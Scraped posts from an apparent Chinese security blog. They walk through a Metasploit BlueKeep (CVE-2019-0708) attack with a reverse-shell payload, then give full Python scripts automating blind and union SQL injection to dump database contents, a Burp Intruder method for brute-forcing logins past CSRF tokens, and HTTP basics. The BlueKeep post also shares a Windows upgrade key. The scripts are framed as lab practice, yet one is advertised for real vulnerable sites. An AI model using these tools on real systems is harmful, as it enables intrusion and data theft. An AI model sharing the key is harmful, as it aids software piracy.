SP1下载连接:ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 在VM14中安装完SP1后会是win7家庭版，需要使用升级。 12341.点击win图标2.然后找到并打开Windows Anytime Upgrade，进入下一步。3.在弹出的界面中选择“输入升级密钥”，进入下一步。4.然后输入RHTBY-VWY6D-QJRJ9-JGQ3X-Q2289，点击下一步继续 在升级完之后就是win7旗舰版 接下来进入控制面板的所有控制面板项中的系统，点击远程设置。在远程设置中勾选允许运行任意版本即可。 KALI环境搭建更新MSF首先要将MSF更新到最新版本，在最新版本中才会包括0708的利用模块。 默认使用kali官方源来更新 apt-get update apt-get install metasploit-framework 如果觉得官方源慢可以更换其他源 用leafpad打开sources.list，把其他源加入进去。 leafpad /etc/apt/sources.list 123456789101112131415161718192021deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云kali更新源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#163 DEBIAN源deb http://mirrors.163.com/debian wheezy main non-free contribdeb-src http://mirrors.163.com/debian wheezy main non-free contribdeb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contribdeb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contribdeb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib 载入攻击模块下载Reference中的攻击模块放入msf的响应文件夹中（如果已存在同名文件，直接覆盖即可。如没有则自己创建） 模块下载地址 12链接：https://pan.baidu.com/s/1vIlYYn9RlJ0KUMTzFhMsVQ 提取码：ax18 里面有四个攻击模块 将攻击模块一一放入放入如下路径中 1234rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.dbcve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 使用攻击命令使用msfconsole命令进入metasploit-framework框架 进入以后使用reload_all重新加载0708rdp利用模块 使用use exploit/windows/rdp/cve_2019_0708_bluekeep_rce启用0708RDP攻击模块 使用info可以查看工具相关信息以及设置 可以看到我们需要设置的选项主要为RHOSTS \\ RPORT \\ target 12345使用set RHOSTS 设置靶机IP使用set RPORT 设置靶机PORT使用set target ID数字（可选为1-4）每种都代表了机器架构 在我的复现环境中使用target 3即可 目标靶机的IP为192.168.100.248 接下来设置如下参数： 1234567目标IP：set RHOSTS 192.168.100.248目标端口: set RPORT 3389架构id: set target 3载入playload: set payload generic/shell_reverse_tcp 设置完参数之后，使用run开启攻击。 可以看到反弹成功了，ip为目标机IP 参考链接 win7开启远程桌面 kali 更新msf CVE-2019-0708远程桌面代码执行漏洞复现 添加CVE-2019-0708","categories":[],"tags":[]},{"title":"python脚本之盲注脚本","slug":"python脚本之布尔盲注","date":"2019-09-01T09:38:37.702Z","updated":"2019-09-07T16:06:08.135Z","comments":true,"path":"2019/09/01/python脚本之布尔盲注/","link":"","permalink":"https://0xxk.github.io/2019/09/01/python脚本之布尔盲注/","excerpt":"利用脚本去代替人工查询盲注","text":"利用脚本去代替人工查询盲注 本脚本只针对mysql-sqli注入实验室中的GET型盲注有用，且需要手动判断截断字符。 查库的数据AND查表的数据AND查字段的数据，根本上都是进行了三部，首先查行数，再查每行字符数，最后查每行的单个数据。所以先要针对这三部分的代码进行编写。 查看行数的代码 1234567891011def chahangshu(url,url1,url2,url3): global jieduan print url1,url2,url3 url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot; print url for i in range(0,29): url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1]) url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1]) jieguo = qingqiu(url_i1,url_i2) if jieguo: return i+1 查看每行字符数的代码 123456789101112131415def chazifushu(url,url_chashuzi,hangshu): global jieduan url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi list = [] for i in range(hangshu): url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot; for j in range(0,50): url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1] url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1] jieguo = qingqiu(url3_1, url3_2) if jieguo: print &quot;第&#123;&#125;行字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1) list.append(j+1) break return list 查看每行的单个字符数据 123456789101112131415161718192021222324def chashuzhi(url,url_chashuzi,hangshu,zifushu): global jieduan list = [] qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi for i in range(hangshu): qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot; flag = &quot;&quot; for j in range(zifushu[i]): qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1) for m in range(33,127): qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1] qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1] jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2) if jieguo: print chr(m+1), flag+= chr(m+1) break print flag list.append(flag) print list return list 接下来就是数据库调用、数据表调用、字符调用的函数了。 数据库调用 12345678910111213def chaschema_name(url): url_schema1 = &quot;select&quot; url_schema2 = &quot;schema_name&quot; url_schema3 = &quot;from information_schema.schemata&quot; url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3 hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3) print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu) zifushu = chazifushu(url, url_schema, hangshu) print zifushu listhang = chashuzhi(url,url_schema,hangshu,zifushu) print listhang return listhang 数据表调用 1234567891011121314def chatable_name(url,schema_name): url_table1 = &quot;select&quot; url_table2 = &quot;table_name&quot; url_table3 = &quot;from information_schema.tables where table_schema = &apos;&#123;&#125;&apos;&quot;.format(schema_name) url_table = url_table1 + &quot; &quot; + url_table2 + &quot; &quot; + url_table3 hangshu = chahangshu(url, url_table1, url_table2, url_table3) print &quot;&#123;&#125;库一共有&#123;&#125;张表&quot;.format(schema_name,hangshu) zifushu = chazifushu(url, url_table, hangshu) print zifushu listhang = chashuzhi(url, url_table, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhang 字符调用 1234567891011121314151617def chacolumn_name(url,schema_name,table_name): url_column1 = &quot;select&quot; url_column2 = &quot;column_name&quot; url_column3 = &quot;from information_schema.columns where table_schema = &apos;&#123;&#125;&apos; and table_name = &apos;&#123;&#125;&apos;&quot;.format(schema_name,table_name) url_column = url_column1 + &quot; &quot; + url_column2 + &quot; &quot; + url_column3 # print url_column hangshu = chahangshu(url, url_column1, url_column2, url_column3) print &quot;&#123;&#125;表一共有&#123;&#125;个字段&quot;.format(table_name,hangshu) zifushu = chazifushu(url, url_column, hangshu) print &quot;***&quot; print zifushu listhang = chashuzhi(url, url_column, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhang 最后就是当数据库名称，表明称和字段名称都查出来后。总的查询数据的操作： 12345678910111213141516def cha_shuju(url, schema_name,table_name,column_name): url_shuzhi1 = &quot;select&quot; url_shuzhi2 = &quot;&#123;&#125;&quot;.format(column_name) url_shuzhi3 = &quot;from &#123;&#125;.&#123;&#125;&quot;.format(schema_name,table_name) url_shuzhi = url_shuzhi1 + &quot; &quot; + url_shuzhi2 + &quot; &quot; + url_shuzhi3 hangshu = chahangshu(url, url_shuzhi1, url_shuzhi2, url_shuzhi3) print &quot;&#123;&#125;库&#123;&#125;表&#123;&#125;字段一共有&#123;&#125;行&quot;.format(schema_name,table_name,column_name, hangshu) zifushu = chazifushu(url, url_shuzhi, hangshu) print &quot;***&quot; print zifushu listhang = chashuzhi(url, url_shuzhi, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhang 接下来就是中央枢纽： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354def main(): global zifu,jieduan jieduan = [&apos;\\&apos;&apos;,&apos;-- |&apos;] url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot; schema_name = chaschema_name(url) print &quot;一共有如下表&#123;&#125;&quot;.format(schema_name) zhiding_schema = raw_input(&quot;请输入要查询的库名&quot;) i =1 while (i): for i in schema_name: print i,zhiding_schema if zhiding_schema == i: table_name = chatable_name(url, zhiding_schema) print &quot;&#123;&#125;库有如下表&#123;&#125;&quot;.format(zhiding_schema,table_name) i =0 break if(i ==1): zhiding_schema = input(&quot;不存在此库，请检查是否输入错误&quot;) zhiding_table = raw_input(&quot;请输入要查询的表名&quot;) # # print zhiding_table # table_name = [&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;] # zhiding_table = &quot;emails&quot; i = 1 while (i): for i in table_name: print i, zhiding_table if zhiding_table == i: columns_name = chacolumn_name(url, zhiding_schema,zhiding_table) i = 0 print &quot;&#123;&#125;表有如下字段&#123;&#125;&quot;.format(zhiding_table,columns_name) break if(i == 1): zhiding_table = input(&quot;不存在此表，请检查是否输入错误&quot;) zhiding_column = raw_input(&quot;请输入要查询的字段&quot;) # # print zhiding_column # columns_name = [&apos;id&apos;, &apos;email_id&apos;] # zhiding_table = &quot;emails&quot; i = 1 while (i): for i in columns_name: print i, zhiding_column if zhiding_column == i: shuju_name = cha_shuju(url, zhiding_schema, zhiding_table,zhiding_column) print &quot;&#123;&#125;字段数值有&#123;&#125;&quot;.format(zhiding_column,shuju_name) i = 0 break if (i == 1): zhiding_table = input(&quot;不存在此字段，请检查是否输入错误&quot;)if __name__ == &apos;__main__&apos;: main() 总的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191# coding=UTF-8import requestsimport reimport base64import sysreload(sys)sys.setdefaultencoding( &quot;utf-8&quot; )def qingqiu(url1,url2): html1 = requests.get(url1) html2 = requests.get(url2) if html1.text != html2.text: return 1def chahangshu(url,url1,url2,url3): global jieduan print url1,url2,url3 url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot; print url for i in range(0,29): url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1]) url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1]) jieguo = qingqiu(url_i1,url_i2) if jieguo: return i+1def chazifushu(url,url_chashuzi,hangshu): global jieduan url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi list = [] for i in range(hangshu): url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot; for j in range(0,50): url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1] url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1] jieguo = qingqiu(url3_1, url3_2) if jieguo: print &quot;第&#123;&#125;行字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1) list.append(j+1) break return listdef chashuzhi(url,url_chashuzi,hangshu,zifushu): global jieduan list = [] qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi for i in range(hangshu): qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot; flag = &quot;&quot; for j in range(zifushu[i]): qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1) for m in range(33,127): qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1] qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1] jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2) if jieguo: print chr(m+1), flag+= chr(m+1) break print flag list.append(flag) print list return listdef chaschema_name(url): url_schema1 = &quot;select&quot; url_schema2 = &quot;schema_name&quot; url_schema3 = &quot;from information_schema.schemata&quot; url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3 hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3) print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu) zifushu = chazifushu(url, url_schema, hangshu) print zifushu listhang = chashuzhi(url,url_schema,hangshu,zifushu) print listhang return listhangdef chatable_name(url,schema_name): url_table1 = &quot;select&quot; url_table2 = &quot;table_name&quot; url_table3 = &quot;from information_schema.tables where table_schema = &apos;&#123;&#125;&apos;&quot;.format(schema_name) url_table = url_table1 + &quot; &quot; + url_table2 + &quot; &quot; + url_table3 hangshu = chahangshu(url, url_table1, url_table2, url_table3) print &quot;&#123;&#125;库一共有&#123;&#125;张表&quot;.format(schema_name,hangshu) zifushu = chazifushu(url, url_table, hangshu) print zifushu listhang = chashuzhi(url, url_table, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhangdef chacolumn_name(url,schema_name,table_name): url_column1 = &quot;select&quot; url_column2 = &quot;column_name&quot; url_column3 = &quot;from information_schema.columns where table_schema = &apos;&#123;&#125;&apos; and table_name = &apos;&#123;&#125;&apos;&quot;.format(schema_name,table_name) url_column = url_column1 + &quot; &quot; + url_column2 + &quot; &quot; + url_column3 # print url_column hangshu = chahangshu(url, url_column1, url_column2, url_column3) print &quot;&#123;&#125;表一共有&#123;&#125;个字段&quot;.format(table_name,hangshu) zifushu = chazifushu(url, url_column, hangshu) print &quot;***&quot; print zifushu listhang = chashuzhi(url, url_column, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhangdef cha_shuju(url, schema_name,table_name,column_name): url_shuzhi1 = &quot;select&quot; url_shuzhi2 = &quot;&#123;&#125;&quot;.format(column_name) url_shuzhi3 = &quot;from &#123;&#125;.&#123;&#125;&quot;.format(schema_name,table_name) url_shuzhi = url_shuzhi1 + &quot; &quot; + url_shuzhi2 + &quot; &quot; + url_shuzhi3 hangshu = chahangshu(url, url_shuzhi1, url_shuzhi2, url_shuzhi3) print &quot;&#123;&#125;库&#123;&#125;表&#123;&#125;字段一共有&#123;&#125;行&quot;.format(schema_name,table_name,column_name, hangshu) zifushu = chazifushu(url, url_shuzhi, hangshu) print &quot;***&quot; print zifushu listhang = chashuzhi(url, url_shuzhi, hangshu, zifushu) print &quot;------&quot; print listhang print &quot;------&quot; return listhangdef main(): global zifu,jieduan jieduan = [&apos;\\&apos;&apos;,&apos;-- |&apos;] url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot; schema_name = chaschema_name(url) print &quot;一共有如下表&#123;&#125;&quot;.format(schema_name) zhiding_schema = raw_input(&quot;请输入要查询的库名&quot;) i =1 while (i): for i in schema_name: print i,zhiding_schema if zhiding_schema == i: table_name = chatable_name(url, zhiding_schema) print &quot;&#123;&#125;库有如下表&#123;&#125;&quot;.format(zhiding_schema,table_name) i =0 break if(i ==1): zhiding_schema = input(&quot;不存在此库，请检查是否输入错误&quot;) zhiding_table = raw_input(&quot;请输入要查询的表名&quot;) # # print zhiding_table # table_name = [&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;] # zhiding_table = &quot;emails&quot; i = 1 while (i): for i in table_name: print i, zhiding_table if zhiding_table == i: columns_name = chacolumn_name(url, zhiding_schema,zhiding_table) i = 0 print &quot;&#123;&#125;表有如下字段&#123;&#125;&quot;.format(zhiding_table,columns_name) break if(i == 1): zhiding_table = input(&quot;不存在此表，请检查是否输入错误&quot;) zhiding_column = raw_input(&quot;请输入要查询的字段&quot;) # # print zhiding_column # columns_name = [&apos;id&apos;, &apos;email_id&apos;] # zhiding_table = &quot;emails&quot; i = 1 while (i): for i in columns_name: print i, zhiding_column if zhiding_column == i: shuju_name = cha_shuju(url, zhiding_schema, zhiding_table,zhiding_column) print &quot;&#123;&#125;字段数值有&#123;&#125;&quot;.format(zhiding_column,shuju_name) i = 0 break if (i == 1): zhiding_table = input(&quot;不存在此字段，请检查是否输入错误&quot;)if __name__ == &apos;__main__&apos;: main()","categories":[],"tags":[]},{"title":"python脚本之联合注入脚本","slug":"python脚本之联合查询","date":"2019-09-01T09:38:09.952Z","updated":"2019-09-07T16:10:30.293Z","comments":true,"path":"2019/09/01/python脚本之联合查询/","link":"","permalink":"https://0xxk.github.io/2019/09/01/python脚本之联合查询/","excerpt":"此脚本能实现最基础的联合查询注入。","text":"此脚本能实现最基础的联合查询注入。 此脚本不仅能在mysql-sqli1-5关中使用之外，还可以在一般的无WAF且有回显的漏洞网站中使用。可以自动判断截断符号，自动跑出所有的数据。 脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292# coding=UTF-8import requestsimport reimport base64import sysreload(sys)sys.setdefaultencoding( &quot;utf-8&quot; )# 验证是否有注入def yanzhengceshi(url,html_text1): global jieduan zhushifu = [&apos;%23&apos;, &apos;--+&apos;] for i in zhushifu: xurl = url + i print xurl rurl_text = requests.get(xurl) html_text3 = len(rurl_text.text) print html_text3 rurl_base = base64.b64encode(rurl_text.text) html_chaju = abs(html_text1 - html_text3) if (html_chaju &lt; 8 ): jieduan[1] = i print xurl return xurl# 找到报错点def ceshi(): global start_url, i, lists, jieduan global jieduan # 最初始的URL请求信息 start_url_text = requests.get(start_url) print start_url html_text1 = len(start_url_text.text) print html_text1 start_url_base = base64.b64encode(start_url_text.text) # 截断后的信息 url = start_url + i url2 = url + &apos; and 1=2&apos; print url url_text = requests.get(url2) print url2 html_text2 = len(url_text.text) print html_text2 url_base = base64.b64encode(url_text.text) jieguo = yanzhengceshi(url,html_text1) html_chaju = abs(html_text1 - html_text2) print html_chaju if (html_chaju &gt; 15) and jieguo: print jieguo lists.append(jieguo) print &quot;i==&#123;&#125;&quot;.format(i) jieduan[0] = i# 拼接截断字符def testsql(): global start_url global start_url, i, lists, jieduan lists = [] jieduan = [&apos;&apos;, &apos;&apos;] playload = [&quot;\\&apos;&quot;, &quot;\\&apos;)&quot;, &quot;\\&quot;&quot;, &quot;\\&quot;)&quot;, &quot;&quot;] for i in playload: ceshi() print i print lists if lists: print &quot;[!]存在注入，注入点为&#123;&#125;&quot;.format(lists[0]) return jieduan else: print &quot;[!]不存在注入，程序退出&quot; exit()# 查询字段位数def chaziduanqingqiu(czdqq_url): shuju = requests.get(czdqq_url) html_text4 = len(shuju.text) return html_text4# 拼接字段位数def chaziduan(): global start_url, jieduan # print &quot;截断&#123;&#125;&quot;.format(jieduan[0]) chushi = &apos;&apos; czd_url = start_url ziduanshu = [] zhuruziduan = [] print &quot;截断[0]为&#123;&#125;&quot;.format(jieduan[0]) for i in range(1, 15): czd_url = start_url + jieduan[0] + &apos; order by &apos; + str(i) + jieduan[1] print czd_url print i shuzhi = chaziduanqingqiu(czd_url) ziduanshu.append(shuzhi) print ziduanshu for i in range(len(ziduanshu) - 1): if (abs(ziduanshu[i]-ziduanshu[i+1]) &gt; 5): print &quot;[!]注入字段数为&#123;&#125;&quot;.format(i + 1) zhuruziduan.append(i + 1) print ziduanshu return zhuruziduan# 查询显示位def chaxianshiweiqingqiu(strings, liebiao): shuju = requests.get(url=strings) xiabiao = [] print shuju.text for i in range(len(liebiao)): r = r&quot;[^&apos;]0xxk&#123;&#125;[^&apos;]&quot;.format(i) print r jieguo = re.search(r, shuju.text) print jieguo if jieguo: print i xiabiao.append(i) print xiabiao print &quot;---&quot; return xiabiao# 拼接显示位def chaxianshiwei(): global start_url, ziduan, jieduan,xunhuanziduan print &quot;[!]可注入的下标为:&quot;, chushi_url = start_url xianshiziduan = ziduan xiabiao = [] for m in xianshiziduan: liebiao = [] MC = &apos;&apos; stringS = &apos;&apos; strings = &apos;&apos; for i in range(m): MC = &apos;0xxk&apos; + str(i) mingcheng = MC liebiao.append(mingcheng) stringS += &apos;\\&apos;&apos; + mingcheng + &apos;\\&apos;&apos; strings = stringS stringS += &apos;,&apos; strings = start_url + jieduan[0] + &quot; and 1=2 union select &quot; + strings + jieduan[1] print strings print &apos;666&apos; print liebiao xiabiao = chaxianshiweiqingqiu(strings, liebiao) if not xiabiao: continue xunhuanziduan = len(liebiao) print len(liebiao) print &quot;12345&quot; for i in range(len(xiabiao)): print &quot;&#123;&#125;&quot;.format(xiabiao[i]), return xiabiao# 在这里取出爆破出的数据def zongchaxun(ChuShi_url): shuju = requests.get(url=ChuShi_url) r = r&quot;\\*&#123;3&#125;([^,]*)\\*&#123;3&#125;&quot; CXlist = re.findall(r, shuju.text) for i in range(len(CXlist)): CXlist[i] = str(CXlist[i]) return CXlist# 在这里拼接所有的PlayLoaddef pingjiePL(yuju): global start_url, jieduan, xunhuanziduan, xiabiao chushi_url = start_url + jieduan[0] + &quot; and 1=2&quot; + &quot; union select &quot; for i in range(int(xunhuanziduan)): if i == xiabiao[0]: chushi_url += yuju else: chushi_url += str(i) ChuShi_url = chushi_url chushi_url += &apos;,&apos; print &apos;\\n&apos;, ChuShi_url += &quot; &quot; + jieduan[1] print ChuShi_url list = zongchaxun(ChuShi_url) return list# 开始暴库def baoku(): global start_url, xunhuanziduan, xiabiao global jieduan yuju = &quot;(select group_concat(&apos;***&apos;,schema_name,&apos;***,&apos;) from information_schema.schemata),&quot; playload_ku = pingjiePL(yuju) if playload_ku: print &quot;网站数据库有:&quot; for i in playload_ku: print i return playload_ku else: print &quot;网站没有数据库&quot;# 开始爆表def baobiao(): global start_url, xunhuanziduan, xiabiao, table_schema global jieduan yuju = &quot;(select group_concat(&apos;***&apos;,table_name,&apos;***,&apos;) from information_schema.tables where table_schema=&apos;&quot; + table_schema + &quot;\\&apos;),&quot; playload_tables = pingjiePL(yuju) if playload_tables: print &quot;&#123;&#125;数据库有如下表:&quot;.format(table_schema) for i in playload_tables: print i return playload_tables else: print &quot;&#123;&#125;没有表&quot;.format(table_schema)# 开始爆字段def baoziduan(): global start_url, xunhuanziduan, table_schema, xiabiao, table_name global jieduan yuju = &quot;(select group_concat(&apos;***&apos;,column_name,&apos;***,&apos;) from information_schema.columns where table_name=&apos;&#123;&#125;&apos; and table_schema=&apos;&#123;&#125;&apos;),&quot;.format( table_name, table_schema) playload_columns = pingjiePL(yuju) print len(playload_columns) if playload_columns: print &quot;&#123;&#125;数据库有如下字段:&quot;.format(table_name) for i in playload_columns: print i return playload_columns else: print &quot;&#123;&#125;没有字段&quot;.format(table_name)# 开始爆数据def baoshuju(): global xunhuanziduan, table_name, table_schema, xiabiao, column_name global start_url global jieduan yuju = &quot;(select group_concat(&quot; yuju_One = yuju for i in range(len(column_name)): yuju_One += &quot;&apos;***&apos;,&#123;&#125;,&apos;***,&apos;&quot;.format(column_name[i]) yuju = yuju_One yuju_One += &apos;,&apos; yuju += &quot;) from &#123;&#125;.&#123;&#125;),&quot;.format(table_schema, table_name) playload_shuju = pingjiePL(yuju) for i in range(len(playload_shuju)): if i % len(column_name) == 0: print &apos;\\n&apos;, print playload_shuju[i],&apos;::&apos;,def main(): global start_url, ziduan, xiabiao, jieduan, table_schema, table_name, column_name, xunhuanziduan start_url = &quot;http://192.168.107.128/sqli/Less-1/?id=1&quot; jieduan = testsql() # 截断字符 print &quot;总的截断为&#123;&#125;&quot;.format(jieduan) ziduan = chaziduan() # 有多少显示位 print ziduan print &apos;1111111&apos; xiabiao = chaxianshiwei() # 显示位下标 print &quot;可显示下标为&#123;&#125;&quot;.format(xiabiao) print &quot;有&#123;&#125;位显示位&quot;.format(xunhuanziduan) playload_ku = baoku() # 爆出的数据库 table_schema = raw_input(&quot;请输入要爆的数据库名&quot;) playload_tables = baobiao() # 爆出的表 table_name = &quot;servers&quot; playload_columns = baoziduan() # 爆出的字段 column_name = playload_columns playload_shuju = baoshuju() # 爆出的数据if __name__ == &apos;__main__&apos;: main()","categories":[],"tags":[]},{"title":"burp绕过token验证","slug":"burp绕过token验证","date":"2019-08-21T13:55:46.075Z","updated":"2019-08-21T14:38:53.722Z","comments":true,"path":"2019/08/21/burp绕过token验证/","link":"","permalink":"https://0xxk.github.io/2019/08/21/burp绕过token验证/","excerpt":"绕过","text":"绕过 BurpSuite intruder attack-type 4种爆破模式： Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变 Battering ram 多参数同时爆破，但用的是同一个字典 Pichfork 多参数同时爆破，但用的是不同的字典 Cluster bamb 多参数做笛卡尔乘积模式爆破 关于token: token主要用来防御csrf，而无法防止暴力破解，这是因为将一个随机产生的token加入请求之后，每次请求token都会改变，csrf攻击者只能窃取受害者的cookie却不能伪造当次请求的token，token无法防止暴力破解的原因是token每次都会随页面返回到前端，攻击者只要想办法自动化获得前端的token即可进行暴力破解攻击。 抓包后发现有token参数 将Attack type更改为Pichfork，即多参数同时爆破，使用不同的字典 将username,password,token设置为变量，并分别为前两个变量设置字典 对于第三个参数，在option中找到grep -Extract然后点击add Grep -Extract:这个设置能够被用来通过请求返回的信息来获取有用的信息供你使用。也就是说，可以通过它来获得每次请求后返回的token，关联到payload中进行暴力破解。 点击fetch response，查找token，找到token值所在位置 点击OK 这里勾上 将第二个变量的Payload type选择成Recursive grep,下面自动出现刚刚选中的信息。 最后将下面的always勾选上 这样就设置完毕了，需要注意的是burp的Pichfork爆破模式只能进行单线程的 爆破，因此将线程改为1 这时候就爆破成功了","categories":[],"tags":[]},{"title":"HTTP基础","slug":"HTTP基础","date":"2019-08-21T12:42:51.003Z","updated":"2019-08-21T14:39:58.852Z","comments":true,"path":"2019/08/21/HTTP基础/","link":"","permalink":"https://0xxk.github.io/2019/08/21/HTTP基础/","excerpt":"作业","text":"作业 一.HTTP协议HTTP协议是超文本传输协议，基于TCP/IP通信协议来传递数据，是一个属于应用层的面向对象的协议。常用状态码 状态码 意义 200 OK 从客户端发来的请求在服务器端被正常处理 204 No Content 服务器接收的请求已成功处理，但在返回响应报文中不含实体的主体部分 301 Moved Permanently 永久性重定向 302 Found 临时性重定向 304 Not Modified 客户端发送附带条件请求时，服务器端允许请求访问资源，但未满足条件的情况 400 Bad Request 请求报文中存在语法错误 403 Forbidden 对请求资源的访问被服务器拒绝 404 Not Found 服务器上无法找到请求的资源 500 lnternal Server Error 服务器端在执行请求时发生了错误 二.HTTP URLURL,中文叫做统一资源定位符，是互联网上用来表示某一处资源的地址。 以下面这个URL为例，介绍下普通URL的各部分组成：http :// www.asp.com: 8080 /news /index.asp? boardID=5&amp;ID=24618&amp;page=1# name协议部分 域名部分 端口部分 虚拟目录部分 文件名部分 参数部分 锚部分 HTTP之请求方法 根据HTTP标准，HTTP请求可以使用多种请求方法。 HTTP1.0 HTTP1.1 GET,POST,HEAD GET,POST,HEADOPTIONS,PUT,DELETE,TRACE,CONNECT 描述 序号 方法 描述 1 GET 请求指定的页面信息，并返回实体主体。 2 HEAD 类似于GET请求，只不过返回的响应中没有具体的内容，用于获取报头。 3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有的资源的修改。 4 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 5 DELETE 请求服务器删除指定的特面。 6 CONNECT HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。 7 OPTIONS 允许客户端查看服务器的性能。 8 TRACE 回显服务器收到的请求，主要用于测试或诊断。 9 PATCH 是对PUT方法的补充，用来对已知资源进行局部更新。 三.计算机网络模型基础OSI模型总共分为七层，从下到上分别是：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。每层基本协议如下图所示： 四.http协议中，常见头部字段信息的含义（请求头和响应头）Request 第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本. 第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息 从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等 第三部分：空行，请求头部后面的空行是必须的 即使第四部分的请求数据为空，也必须有空行。 第四部分：请求数据也叫主体，可以添加任意的其他数据。 这个例子的请求数据为空。 1234567GET /index.asp HTTP/1.1 请求行，说明请求类型,要访问的资源以及所使用的HTTP版本Host 请求地址User-Agent 浏览器信息Accept 设置接收文件的类型Referer 请求当前页面的前一个地址Accept-Encoding 设置接收的编码类型Accept-Language 设置接收的语言 12345678POST / HTTP1.1Host:User-Agent:Content-Type: 内容MIME类型Content-Length: 内容长度Connection: Keep-Alive 控制不再转发给代理的首部字段、管理持久连接 空行name=Professional%20Ajax&amp;publisher=Wiley 数据内容 